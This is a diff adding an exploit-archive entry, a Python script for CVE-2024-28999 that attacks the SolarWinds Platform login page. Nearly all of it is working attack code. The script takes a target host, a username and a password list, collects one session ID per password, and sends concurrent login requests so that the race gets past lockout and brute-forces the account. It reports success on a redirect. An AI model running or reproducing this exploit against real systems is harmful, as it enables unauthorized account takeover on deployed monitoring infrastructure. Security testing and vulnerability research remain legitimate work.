@@ -1,0 +1,85 @@
+id: 39665
+date: 06/26/2024
+title: SolarWinds Platform 2024.1 SR1 - Race Condition Expoit
+author: Elhussain Fathy
+cves: CVE-2024-28999
+
+# Exploit Title: SolarWinds Platform 2024.1 SR1 - Race Condition
+# CVE: CVE-2024-28999
+# Affected Versions: SolarWinds Platform 2024.1 SR 1 and previous versions
+# Author: Elhussain Fathy, AKA 0xSphinx
+
+import requests
+import urllib3
+import asyncio
+import aiohttp
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+http = urllib3.PoolManager(cert_reqs='CERT_REQUIRED')
+
+# host = '192.168.1.1'
+# username = "admin"
+# file_path = "passwords.txt"
+
+host = input("Enter the host: ")
+username = input("Enter the username: ")
+file_path = input("Enter the passwords file path: ")
+exploited = 0
+
+url = f"https://{host}:443/Orion/Login.aspx?ReturnUrl=%2F"
+
+passwords = []
+with open(file_path, 'r') as file:
+    for line in file:
+        word = line.strip()
+        passwords.append(word)
+print(f"Number of tested passwords: {len(passwords)}")
+
+
+headers = {
+    'Host': host,
+}
+
+sessions = []
+
+for _ in range(len(passwords)):
+    response = requests.get(url, headers=headers, verify=False, stream=False)
+    cookies = response.headers.get('Set-Cookie', '')
+    session_id = cookies.split('ASP.NET_SessionId=')[1].split(';')[0]
+    sessions.append(session_id)
+
+
+
+
+async def send_request(session, username, password):
+    headers = {
+        'Host': host,  
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Cookie': f'ASP.NET_SessionId={session}; TestCookieSupport=Supported; Orion_IsSessionExp=TRUE',
+    }
+
+    data = f'__EVENTTARGET=ctl00%24BodyContent%24LoginButton&__EVENTARGUMENT=&__VIEWSTATE=AEQKNijmHeR5jZhMrrXSjzPRqhTz%2BoTqkfNmc3EcMLtc%2FIjqS37FtvDMFn83yUTgHBJIlMRHwO0UVUVzwcg2cO%2B%2Fo2CEYGVzjB1Ume1UkrvCOFyR08HjFGUJOR4q9GX0fmhVTsvXxy7A2hH64m5FBZTL9dfXDZnQ1gUvFp%2BleWgLTRssEtTuAqQQxOLA3nQ6n9Yx%2FL4QDSnEfB3b%2FlSWw8Xruui0YR5kuN%2BjoOH%2BEC%2B4wfZ1%2BCwYOs%2BLmIMjrK9TDFNcWTUg6HHiAn%2By%2B5wWpsj7qiJG3%2F1uhWb8fFc8Mik%3D&__VIEWSTATEGENERATOR=01070692&ctl00%24BodyContent%24Username={username}&ctl00%24BodyContent%24Password={password}'
+
+    async with aiohttp.ClientSession() as session:
+        async with session.post(url, headers=headers, data=data, ssl=False, allow_redirects=False) as response:
+            if response.status == 302:
+                global exploited
+                exploited = 1
+                print(f"Exploited Successfully Username: {username}, Password: {password}")
+
+
+async def main():
+    tasks = []
+    for i in range(len(passwords)):
+        session = sessions[i]
+        password = passwords[i]
+        task = asyncio.create_task(send_request(session, username, password))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+asyncio.run(main())
+
+if(not exploited):
+    print("Exploitation Failed")
+
+#  0day.today [2024-06-27]  #
